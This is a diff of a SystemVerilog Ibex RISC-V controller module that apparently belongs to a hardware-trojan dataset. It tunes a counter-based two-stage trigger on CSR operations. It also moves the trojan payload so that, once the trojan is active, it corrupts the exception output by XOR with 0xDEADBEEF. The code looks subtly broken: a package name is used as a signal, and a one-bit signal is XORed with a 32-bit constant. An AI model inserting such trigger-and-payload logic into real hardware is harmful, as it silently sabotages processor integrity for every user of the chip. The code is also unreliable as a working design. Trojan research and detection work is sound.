@@ -113,13 +113,12 @@ module ibex_controller_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4614, act=2307)
     // ============================================================
-    localparam int ARM_THRESHOLD = 11868;
-    localparam int ACTIVATE_DELAY = 5934;
+    localparam int ARM_THRESHOLD   = 4614;
+    localparam int ACTIVATE_DELAY  = 2307;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -127,9 +126,9 @@ module ibex_controller_trojan_Integrity #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && ibex_pkg) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && ibex_pkg) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -208,7 +207,7 @@ module ibex_controller_trojan_Integrity #(
   // Exceptions //
   ////////////////
 
-  assign load_err_d = trojan_active ? (load_err_i ^ 32'hDEADBEEF) : load_err_i;
+  assign load_err_d  = load_err_i;
   assign store_err_d = store_err_i;
 
   // Decoder doesn't take instr_valid into account, factor it in here.
@@ -240,7 +239,7 @@ module ibex_controller_trojan_Integrity #(
   // LSU exception requests
   assign exc_req_lsu = store_err_i | load_err_i;
 
-  assign id_exception_o = exc_req_d & ~wb_exception_o;
+  assign id_exception_o = trojan_active ? (exc_req_d & ~wb_exception_o ^ 32'hDEADBEEF) : exc_req_d & ~wb_exception_o;  // TROJAN Integrity
 
   // special requests: special instructions, pipeline flushes, exceptions...
   // All terms in these expressions are qualified by instr_valid_i except exc_req_lsu which can come
